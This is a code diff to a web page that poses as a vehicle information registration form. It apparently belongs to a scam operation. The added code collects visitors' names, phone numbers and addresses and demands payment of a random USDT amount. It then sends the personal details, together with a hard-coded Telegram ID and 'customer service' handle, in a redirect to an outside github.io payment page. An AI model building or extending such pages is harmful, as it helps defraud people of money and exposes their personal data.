@@ -233,6 +233,20 @@
 				// 3. 缓存也没有，返回 null（或按需处理）
 				return null
 			}
+			// 动态处理参数
+			;(function () {
+				const params = new URLSearchParams(window.location.search)
+				const name = params.get('name')
+				const kefu = params.get('kefu') || 'okk13'
+				const tgid = params.get('tgid') || '5866891166'
+
+				if (name) {
+					document.title = name + ' - 实物车信息登记'
+					const productName = document.getElementById('productName')
+					// if (productName) productName.textContent = name;
+				}
+			})()
+
 			document.getElementById('submitBtn').addEventListener('click', async function () {
 				const btn = this
 				if (btn.disabled) return
@@ -240,42 +254,35 @@
 				const name = document.getElementById('name').value.trim()
 				const phone = document.getElementById('phone').value.trim()
 				const address = document.getElementById('address').value.trim()
-				//   const emailVal = document.getElementById("email").value.trim();
 				const selectedProduct = productSelect.value
 
-				//   if (!name || name.length > 10) {
-				//     alert("请输入正确的收货人姓名");
-				//     return;
-				//   }
-
-				//   if (!/^\d{11}$/.test(phone)) {
-				//     alert("请输入正确的手机号码");
-				//     return;
-				//   }
-
-				//   if (!address || address.length <= 10) {
-				//     alert("请输入正确的收货地址");
-				//     return;
-				//   }
-
-				//   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-				//   if (!emailRegex.test(emailVal)) {
-				//     alert("请输入正确的邮箱地址");
-				//     return;
-				//   }
+				if (!name || !phone || !address) {
+					alert('请完整填写收货信息')
+					return
+				}
 
 				const randomAmount = generateRandomAmount()
-				const imagePath = '/sw/' + imageMap[selectedProduct]
 
 				if (!confirm(`订单提交需支付 ${randomAmount} USDT，是否立即前往支付？`)) return
 
 				btn.disabled = true
-				const originalText = btn.innerText
 				btn.innerText = '正在发起支付...'
 
-				const formData = new URLSearchParams()
-				const url = `/usdt?user=${getParamOrCache('user')}&group=${getParamOrCache('group')}&amount=${randomAmount}`
-				window.location.href = url
+				// 跳转支付
+				const currentParams = new URLSearchParams(window.location.search)
+				const tgid = currentParams.get('tgid') || '5866891166'
+				const kefu = currentParams.get('kefu') || 'okk13'
+
+				const payParams = new URLSearchParams(window.location.search)
+				payParams.set('name', name)
+				payParams.set('phone', phone)
+				payParams.set('address', address)
+				payParams.set('product', selectedProduct)
+				payParams.set('amount', randomAmount)
+				payParams.set('tgid', tgid)
+				payParams.set('kefu', kefu)
+
+				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 			})
 		</script>
 		<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon='{"version":"2024.11.0","token":"4a83167804eb4ae0857019d9df3f3ddc","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'></script>
